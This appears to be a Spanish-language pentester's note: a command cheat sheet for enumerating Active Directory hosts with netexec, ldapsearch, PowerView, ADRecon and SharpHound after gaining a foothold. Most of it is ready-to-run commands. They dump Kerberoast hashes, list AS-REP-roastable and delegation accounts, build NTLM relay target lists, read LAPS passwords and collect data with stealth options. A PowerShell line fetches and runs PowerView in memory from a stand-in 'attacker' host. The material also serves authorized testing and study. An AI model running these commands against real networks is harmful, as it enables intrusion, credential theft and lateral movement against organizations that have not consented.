---
aliases:
  - netexec AD
  - PowerView
  - ADRecon
  - ldapsearch AD
  - SharpHound Collector
tags:
  - type/tool
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: Tool
linked:
  - '[[AD - Hosts Enumeration]]'
  - '[[netexec]]'
  - '[[BloodHound & SharpHound]]'
  - '[[Impacket Toolkit]]'
---
# AD - Hosts Enumeration - Tooling

***

## netexec (nxc) — Multi-Protocol

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb 10.0.0.0/24` | Hostname + OS + signing + domain | Discovery inicial. |
| `nxc smb 10.0.0.0/24 -u '' -p ''` | Null bind test | Misconfig hunt. |
| `nxc smb hosts.txt -u u -p p --shares` | Shares + read/write flags | Spider prep. |
| `nxc smb hosts.txt -u u -p p --sessions` | Sessions activas (RID > 1000) | Pivot prep. |
| `nxc smb hosts.txt -u u -p p --loggedon-users` | Users logueados ahora | Tier discovery. |
| `nxc smb hosts.txt -u u -p p --laps` | LAPS readable bulk | Cred path. |
| `nxc smb hosts.txt --gen-relay-list relay.txt` | Hosts sin signing | NTLM Relay prep. |
| `nxc smb <DC> -u u -p p --pass-pol` | Password policy | Spray prep. |
| `nxc smb <DC> -u u -p p --rid-brute 5000` | RID brute users + groups | Inventory. |
| `nxc ldap <DC> -u u -p p --users` | Lista users | Inventory rápido. |
| `nxc ldap <DC> -u u -p p --computers` | Lista computers | Inventory. |
| `nxc ldap <DC> -u u -p p --groups` | Lista groups | Inventory. |
| `nxc ldap <DC> -u u -p p --asreproastable` | AS-REP roastable users | Pre-attack. |
| `nxc ldap <DC> -u u -p p --kerberoasting out.txt` | Kerberoast hashes | Pre-attack. |
| `nxc ldap <DC> -u u -p p --trusted-for-delegation` | Unconstrained delegation | Pre-attack. |
| `nxc ldap <DC> -u u -p p --gmsa` | gMSA accounts | Pre-attack. |
| `nxc ldap <DC> -u u -p p --query "(filter)" "attrs"` | Custom LDAP query | Targeted. |
| `nxc ldap <DC> -u '' -p '' --get-domain-info` | RootDSE compact | Sin auth. |
^ad-tool-netexec

```bash
# Pipeline post-foothold
DC=10.10.10.10
USER=auditor; PASS='Pass!'

nxc smb $DC -u "$USER" -p "$PASS" --pass-pol
nxc ldap $DC -u "$USER" -p "$PASS" --users > users.txt
nxc ldap $DC -u "$USER" -p "$PASS" --computers > computers.txt
nxc smb computers.txt -u "$USER" -p "$PASS" --gen-relay-list relay.txt
```

___

## ldapsearch / Linux LDAP

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch -x -h <DC> -s base -b "" namingContexts` | RootDSE anonymous | Bootstrap sin auth. |
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" "(filter)"` | Auth + base + filter estándar | Query genérica. |
| `ldapsearch -H ldaps://<DC> -D 'corp\u' -w pass ...` | LDAPS encrypted | Defender alerta LDAP cleartext. |
| `ldapsearch ... -Y GSSAPI` | Kerberos auth (con TGT) | Tras `kinit`. |
| `ldapsearch ... -E pr=1000/noprompt` | Paged results (>1000 entries) | Domain grande. |
| `ldapsearch ... -s onelevel -b "OU=X"` | Children directos | Drilldown. |
| `ldapsearch ... -s base -b "CN=X"` | Single object | Targeted. |
^ad-tool-ldapsearch

**Bitwise filters útiles** (matching rule `1.2.840.113556.1.4.803`):
- `userAccountControl:1.2.840.113556.1.4.803:=512` → NORMAL_ACCOUNT
- `userAccountControl:1.2.840.113556.1.4.803:=4194304` → DONT_REQ_PREAUTH (AS-REP roast)
- `userAccountControl:1.2.840.113556.1.4.803:=524288` → TRUSTED_FOR_DELEGATION (unconstrained)
- `userAccountControl:1.2.840.113556.1.4.803:=8192` → SERVER_TRUST_ACCOUNT (DCs)

```bash
# Templates listos
LS="ldapsearch -h <DC> -D 'corp\\u' -w pass -b DC=corp,DC=local"

# Users normales
$LS "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=512))" samAccountName userPrincipalName

# Servers
$LS "(&(objectCategory=computer)(operatingSystem=*Server*))" cn dNSHostName operatingSystem

# AS-REP roastable
$LS "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samAccountName

# Kerberoastable
$LS "(&(objectCategory=user)(servicePrincipalName=*))" samAccountName servicePrincipalName

# Unconstrained delegation
$LS "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn dNSHostName
```

___

## PowerView / pywerview

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Domain` | Domain info | Bootstrap. |
| `Get-DomainController -Filter *` | DCs | Inventory. |
| `Get-DomainComputer -Properties Name,OperatingSystem,LastLogonTimestamp` | Computers + atributos | Detail. |
| `Get-DomainUser -SPN` | Users con SPN (kerberoastable) | Pre-attack. |
| `Get-DomainGroup -AdminCount 1` | Priv groups | Tier 0 enum. |
| `Get-DomainOU` | OU tree | Topology. |
| `Get-DomainTrust` / `Get-DomainTrustMapping` | Trusts directos / forest crawl | Cross-domain. |
| `Find-LocalAdminAccess` | Hosts donde sos local admin | Lateral. |
| `Find-DomainShare` | Share recon | Adjacent. |
| `Find-DomainUserLocation` | Hosts donde un user específico está logueado | Targeted hunt. |
| `Find-InterestingDomainAcl` | ACEs peligrosos | Privesc. |
| `Get-NetSession -ComputerName <host>` | Sessions vía RPC | Often blocked Win10+. |
| `Get-NetLoggedOn -ComputerName <host>` | Users logueados | Adjacent. |
| `pywerview get-netuser -u u -p p -d corp.local --dc-ip <DC>` | Linux equivalent | Sin Windows. |
^ad-tool-powerview

```powershell
# Import in-memory (AMSI bypass aparte)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Recon estándar
Get-Domain
Get-DomainController -Filter * | Select Name,IPAddress,OSVersion
Get-DomainComputer -Properties Name,OperatingSystem,LastLogonTimestamp,Description |
  Sort LastLogonTimestamp -Desc
Find-LocalAdminAccess
```

___

## ADRecon / ADCollector / Bulk Reports

| **Tool** | **Comando** | **Output** |
|:---:|:---:|:---:|
| ADRecon | `.\ADRecon.ps1 -Method LDAP -DomainController <DC> -Credential (Get-Credential)` | Excel multi-sheet. |
| ADRecon scoped | `.\ADRecon.ps1 -Collect Forest,Domain,Trusts,Computers,Users,GPOs` | Subset (más rápido). |
| ADCollector | `.\ADCollector.exe --Domain corp.local --Ldaps` | Console log (rápido C#). |
| windapsearch | `python3 windapsearch.py -d corp.local -u u -p p --dc <DC> -m all` | JSON + console. |
| ldapdomaindump | `ldd 'corp\u:p'@<DC> -o report/` | HTML + JSON + GREP. |
| adfind (Joeware) | `adfind -h <DC> -u corp\u -up pass -default -f "(filter)"` | Console legacy. |
| AD Explorer (Sysinternals) | GUI snapshot offline | Browseable .dat. |
| adexplorer-snapshot-parser | Parse `.dat` snapshot | Offline analysis. |
| BloodHound DCOnly | `bloodhound-python -c DCOnly` | Stealth ingest. |
^ad-tool-bulk

```bash
# Linux pipeline
ldd 'corp\\auditor:Pass!'@<DC> -o report/
python3 windapsearch.py -d corp.local -u auditor -p 'Pass!' --dc <DC> -m all

# Windows pipeline
.\ADRecon\ADRecon.ps1 -Method LDAP -DomainController <DC> -Credential (Get-Credential)
.\ADCollector.exe --Ldaps
```

___

## SharpHound / RustHound / BloodHound.py

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SharpHound.exe -c Default` | BH default (sessions, ACLs, group, trusts) | Standard collection. |
| `SharpHound.exe -c All` | Todo (incluye container, ObjectProps) | Comprehensive. |
| `SharpHound.exe -c DCOnly` | Solo data desde DC (no per-host) | Stealth. |
| `SharpHound.exe -c LocalAdmin,Sessions,LoggedOn` | Lateral movement focus | Targeted. |
| `SharpHound.exe -c Session --LoopDuration 24h --LoopInterval 30m` | Loop sessions | Long-term. |
| `SharpHound.exe -c Default --Stealth` | Reducir noise (LDAP only) | OPSEC. |
| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip` | Linux collector | Sin Windows. |
| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip --auth-method ntlm` | Forzar NTLM | Sin Kerberos. |
| `rusthound -d corp.local -u u@corp.local -p pass --zip` | Rust collector cross-platform | Faster. |
| `AzureHound.exe -u u -p p --tenant <id>` | Entra ID collection | Hybrid. |
^ad-tool-sharphound

```bash
# Linux — BloodHound.py estándar
bloodhound-python -d corp.local -u user -p pass -ns 10.10.10.10 -c All --zip -o ./loot/

# Windows — SharpHound stealth
.\SharpHound.exe -c DCOnly --OutputDirectory C:\loot
```

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| HackTricks AD Methodology | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology` |
| The Hacker Recipes | `https://www.thehacker.recipes/ad/` |
| ADSecurity (Sean Metcalf) | `https://adsecurity.org` |
| BloodHound docs | `https://bloodhound.specterops.io` |
| awesome-active-directory | `https://github.com/Orange-Cyberdefense/awesome-activedirectory` |
| GOAD lab | `https://github.com/Orange-Cyberdefense/GOAD` |
| netexec docs | `https://www.netexec.wiki` |
| PowerView | `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1` |
| windapsearch | `https://github.com/ropnop/windapsearch` |
| ldapdomaindump | `https://github.com/dirkjanm/ldapdomaindump` |
^ad-tool-wordlists

***
